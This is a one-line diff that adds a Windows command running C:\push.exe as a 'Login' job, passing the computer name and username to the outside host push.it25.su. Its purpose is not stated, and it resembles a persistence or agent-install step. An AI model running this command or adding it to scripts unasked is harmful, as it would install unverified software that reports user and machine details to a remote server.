@@ -1,0 +1,1 @@
+C:\push.exe --job Login --instance %computername% --install %username%=0 --url https://push.it25.su
